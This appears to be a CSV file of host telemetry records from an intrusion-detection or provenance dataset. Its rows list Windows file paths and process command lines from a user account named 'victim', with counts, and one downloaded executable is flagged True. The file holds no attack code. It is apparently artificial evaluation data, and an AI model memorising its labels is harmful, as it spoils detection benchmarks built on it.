4b5f78ec-7803-4282-8747-cf2cbb215ffa,{'file': 'C:\\Users\\Public\\Desktop\\desktop.ini'},1135,False,3,0,3,3,0,3
02f200ba-4203-4332-b8e1-d4d1bb118c47,{'file': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll'},1678,False,3,0,3,3,0,3
3fc20111-5745-4560-926c-7c3afdcf67fd,{'file': 'C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Utility\\v4.0_3.0.0.0__31bf3856ad364e35\\Microsoft.PowerShell.Commands.Utility.dll'},1699,False,3,0,3,3,0,3
51ef924b-f38d-40cb-91da-767485de6122,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},1786,False,0,2,2,0,3,3
c39a4d78-cdc3-4096-9efd-0cfdd5241649,{'file': 'C:\\Users\\victim\\Downloads\\未确认 23274.crdownload'},2356,False,2,1,3,2,1,3
b3f5266a-afc4-4049-829a-d672182aa155,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},2720,False,0,1,1,0,3,3
0ab077a5-a917-4f9d-abea-9941534910e0,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},7053,False,0,2,2,0,3,3
380436a2-b4f5-46af-abfa-455a202c4c67,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},7210,False,0,2,2,0,3,3
01cb65d2-8144-483c-ba59-f49568c98df4,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},7300,False,0,2,2,0,3,3
5fd81c02-5b81-4a3a-87f9-0eed67f3f839,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},8088,False,0,2,2,0,3,3
31366d52-15de-45bb-9b97-92b71ded7bcb,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},8214,False,0,2,2,0,3,3
3940ca43-259d-4d7a-8d1c-c5f8efeab2c0,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},8338,False,0,2,2,0,3,3
b3f3931a-eac2-4fd3-bef2-b59f1f0b9323,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},8446,False,0,2,2,0,3,3
a615f938-7ba2-4c03-b34a-673c878f2b8f,"{'subject': '""C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe"" '}",10453,True,0,3,3,0,3,3
36ffa520-97f7-4bd4-a968-4646f47bd0e7,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},10646,False,0,2,2,0,3,3
e872a71f-e6d4-42c1-af05-88449cb167f3,{'subject': 'C:\\Windows\\System32\\spoolsv.exe'},234,False,0,1,1,0,2,2
ae8e801e-9a9f-41c3-a6b6-5c5ea2a404c6,{'subject': 'C:\\Windows\\system32\\svchost.exe -k wsappx -p -s AppXSvc'},258,False,0,1,1,0,2,2
bff63736-cad4-41c8-8040-0ca5c4f82108,{'file': 'C:\\Windows\\explorer.exe'},287,False,2,0,2,2,0,2
b1905e04-044b-41df-9890-22105462c10c,{'subject': 'C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding'},334,False,0,1,1,0,2,2
a5bea11d-bdcf-4d49-a226-fd4471023870,{'file': '0:WofCompressedDat'},401,False,2,0,2,2,0,2
9717e6be-fb8d-4e9d-9791-269d3adaefa6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ea153f4c5a8ed11e_0'},613,False,1,1,2,1,1,2
3f7b7cf7-5b12-4f38-8684-1b970a583aec,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ea153f4c5a8ed11e_1'},614,False,1,1,2,1,1,2
dd53a34f-710d-45d8-905e-4d6c9a629ec2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\34651f1f5e3962e1_0'},615,False,1,1,2,1,1,2
667d8470-929b-4d7a-959a-8bdf077417ff,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\34651f1f5e3962e1_1'},616,False,1,1,2,1,1,2
0f2922ba-b152-4960-bda2-39ec4c048a47,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c0ecc04badf9fe4e_0'},617,False,1,1,2,1,1,2
5379a09b-7da9-4566-a18b-bd04ff2ca8f1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c0ecc04badf9fe4e_1'},618,False,1,1,2,1,1,2
ad2eb986-775e-46ca-8394-42d760a56d6a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\eeed066dc4dfd368_0'},619,False,1,1,2,1,1,2
d2d340d6-c514-47ae-afa0-6776f238ff4e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\eeed066dc4dfd368_1'},620,False,1,1,2,1,1,2
db53ba2a-2d39-42a7-9ed7-171231d41a5a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9c548a46a9ecc3f3_0'},621,False,1,1,2,1,1,2
12fe12bd-ce92-40d8-8a95-d3f1f90b517d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9c548a46a9ecc3f3_1'},622,False,1,1,2,1,1,2
48af2a2d-2956-416d-9828-e229fd4a6b49,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9abc299c721fc6c8_0'},623,False,1,1,2,1,1,2
d9f386a5-9222-4c01-a863-ef5d3602604a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9abc299c721fc6c8_1'},624,False,1,1,2,1,1,2
1f78593c-a992-4290-840a-95460b9d3d07,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\71900f6c184705dc_0'},625,False,1,1,2,1,1,2
e50c6bf6-0378-455b-b429-433d1b4764eb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\71900f6c184705dc_1'},626,False,1,1,2,1,1,2
9919e231-5270-4833-b045-3818df490f98,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0e3f91883f72a37f_0'},627,False,1,1,2,1,1,2
a3a87857-cfd9-4c23-bfb7-f5f255071174,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0e3f91883f72a37f_1'},628,False,1,1,2,1,1,2
735584fb-f486-490b-b90f-448cebd10c13,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7c1a4ccbfe4649fb_0'},629,False,1,1,2,1,1,2
60178ca5-c661-4516-9db4-417b53521798,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7c1a4ccbfe4649fb_1'},630,False,1,1,2,1,1,2
d58b5fea-c1b4-4c5e-ad7b-113fd833db27,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\cbcb980587d54e76_0'},631,False,1,1,2,1,1,2
79712cf7-b70d-4315-b1c5-9d6fcb61ef71,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\cbcb980587d54e76_1'},632,False,1,1,2,1,1,2
9898b6c7-b8f2-4f3f-b748-c2458df3a338,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\da03453aa0243259_0'},633,False,1,1,2,1,1,2
8357ef35-07ed-488e-b3c8-7a033d9c644b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\da03453aa0243259_1'},634,False,1,1,2,1,1,2
bdf0c9a5-1a82-4cf0-8ab7-d3ae34d48806,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8200563d2cde530a_0'},635,False,1,1,2,1,1,2
3b4efa08-e426-430f-a861-319e068484b8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8200563d2cde530a_1'},636,False,1,1,2,1,1,2
99d84ec4-dc64-4019-ba45-1025560d23cb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\28faffd4bc3eef38_0'},637,False,1,1,2,1,1,2
3a10486c-3180-4a32-97f0-17b38c50bb12,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\28faffd4bc3eef38_1'},638,False,1,1,2,1,1,2
756ded8c-492c-41d4-89e2-fa682297483f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\efaf6b65ee30e35c_0'},639,False,1,1,2,1,1,2
4b27ee32-e93e-4567-a2ea-91e90e2449f8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\efaf6b65ee30e35c_1'},640,False,1,1,2,1,1,2
964fd4ba-30db-4da9-a354-8396d10baf05,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fd7a9732cf9d29af_0'},641,False,1,1,2,1,1,2
79dc53e3-4cc0-4a7b-adc9-33aa127adf98,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fd7a9732cf9d29af_1'},642,False,1,1,2,1,1,2
c4c6688e-915f-40b1-80a7-905159fc2f64,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\faee6d8d2c8b7b44_0'},643,False,1,1,2,1,1,2
e22107f4-6c19-411a-973d-afc7d1da7c16,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\faee6d8d2c8b7b44_1'},644,False,1,1,2,1,1,2
a808b821-ed7a-476b-9a3a-c598bee01506,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2e42c035390fca99_0'},645,False,1,1,2,1,1,2
c9d7dddb-43d4-4361-b782-8ea3ab94b971,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2e42c035390fca99_1'},646,False,1,1,2,1,1,2
47e453b1-b02a-431a-829b-11d0adc4748e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c313000bd77955e3_0'},647,False,1,1,2,1,1,2
19719416-cac7-444d-9b6a-ea4d50860352,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c313000bd77955e3_1'},648,False,1,1,2,1,1,2
70ac4a5c-fc8a-408b-b74c-6257b37a6be5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9a71944d0c3a81ca_0'},649,False,1,1,2,1,1,2
182ad1b2-5ec2-4548-a7fb-5b1222c99d15,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9a71944d0c3a81ca_1'},650,False,1,1,2,1,1,2
03cc9db2-de95-44f3-9c5d-fdbe17bac34b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\cc1c649c486b5cfd_0'},651,False,1,1,2,1,1,2
86cc06a2-2b61-4e83-94df-669492f87b4a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\cc1c649c486b5cfd_1'},652,False,1,1,2,1,1,2
67ae1104-0f27-485b-a4aa-dd3274f9179f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e94f5e78d6937404_0'},653,False,1,1,2,1,1,2
baeb66a3-b0fb-4fc4-82d8-743074ccd557,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e94f5e78d6937404_1'},654,False,1,1,2,1,1,2
736e1501-42ce-484b-872f-619151502853,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\5ef1c56e79993418_1'},655,False,1,1,2,1,1,2
6805303a-5d26-4643-a438-cae4f5738568,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\5ef1c56e79993418_0'},656,False,1,1,2,1,1,2
d33cfe1b-0ba9-4c34-9be6-71f677962e06,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e49f5c1fe5b7ebde_0'},657,False,1,1,2,1,1,2
ecb970d3-1c55-43bc-af18-a1434301522e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e49f5c1fe5b7ebde_1'},658,False,1,1,2,1,1,2
df2343b6-d21a-4e13-9bcc-60b32f318aaf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\36535ee8017d40d1_0'},659,False,1,1,2,1,1,2
99304ab1-83f5-4b51-86c7-3c6443050541,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\36535ee8017d40d1_1'},660,False,1,1,2,1,1,2
07bd0548-16ce-4066-b6dc-4cea1796afb9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6822ccb717ca4e3d_0'},661,False,1,1,2,1,1,2
374ce77c-f6bd-45c9-9a7c-022868a600d0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6822ccb717ca4e3d_1'},662,False,1,1,2,1,1,2
4f52965e-9773-4dc7-aa8f-1565b913de63,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6cb67d97a6b3818e_0'},663,False,1,1,2,1,1,2
9c6976ba-ac56-48c0-aac0-aa7f5d132561,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6cb67d97a6b3818e_1'},664,False,1,1,2,1,1,2
119ff01d-af63-4182-add4-aa22d0f7faa9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\63e665bfcc49a593_0'},665,False,1,1,2,1,1,2
d7d66184-d080-437b-bc89-ee69c1d6f6fe,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\63e665bfcc49a593_1'},666,False,1,1,2,1,1,2
253fc1f7-bc5b-4027-9a14-d6f356cc747d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8e38ffd9624144d3_0'},667,False,1,1,2,1,1,2
fd5c0b13-3731-4299-a428-b943700334cc,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8e38ffd9624144d3_1'},668,False,1,1,2,1,1,2
49c44088-9726-4067-b914-fb9540cd78f2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\06819d33dd31b502_0'},669,False,1,1,2,1,1,2
d7942b84-d75b-4abf-8d42-4dd0f64d7c16,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\06819d33dd31b502_1'},670,False,1,1,2,1,1,2
6cc4e256-c6e8-44a3-b866-8ed971af81a3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\aa2f6ea3c3f10dd3_0'},671,False,1,1,2,1,1,2
e1b88314-cafe-4eb9-aaa3-36ffd47e36a4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\aa2f6ea3c3f10dd3_1'},672,False,1,1,2,1,1,2
1ea78e57-87a2-4bd5-bff0-322caeb728f6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\dcb2dbe275c48c9e_0'},673,False,1,1,2,1,1,2
5b2408d0-59bf-4626-887d-beb463a10de6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\dcb2dbe275c48c9e_1'},674,False,1,1,2,1,1,2
a54e5a45-e56c-43c1-9d18-49292875ff8f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3a0508414b5e7a05_0'},675,False,1,1,2,1,1,2
ed062db2-2bb7-4541-ae32-d1ea17eb6a0c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3a0508414b5e7a05_1'},676,False,1,1,2,1,1,2
281257b0-1f75-4261-be7b-f60a4388846c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d8d32a83553fe5a8_0'},677,False,1,1,2,1,1,2
f605810d-26a0-482e-9b30-15c5c29f8427,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d8d32a83553fe5a8_1'},678,False,1,1,2,1,1,2
20a4a63d-213f-4609-92fc-9c6bb0773cdc,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\781fb11327496ef5_0'},679,False,1,1,2,1,1,2
1c0c2e6a-40a0-488f-b4d7-43411b66e025,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\781fb11327496ef5_1'},680,False,1,1,2,1,1,2
51a65fc9-2c3e-47dd-bc09-4fd2daa36cad,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\40eb8c22f2eba043_0'},681,False,1,1,2,1,1,2
8ddd2409-f5d9-4500-8ac2-d425a6071be6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\40eb8c22f2eba043_1'},682,False,1,1,2,1,1,2
14e2306c-7ff2-4eb2-801b-7f2bdb465043,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ce35b503af635734_0'},683,False,1,1,2,1,1,2
06d87ae4-f7e8-46c5-bb75-8053e0df901a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ce35b503af635734_1'},684,False,1,1,2,1,1,2
a0c3ea60-2516-4ba2-b698-cbd725f6c14c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\1a403dabc394cf65_0'},685,False,1,1,2,1,1,2
1f5b65b4-11d3-426e-a26c-eb1f8f640c1f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\1a403dabc394cf65_1'},686,False,1,1,2,1,1,2
728b6518-8fcf-4ee0-945d-aaaaae15b616,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\671feb07fca38274_0'},687,False,1,1,2,1,1,2
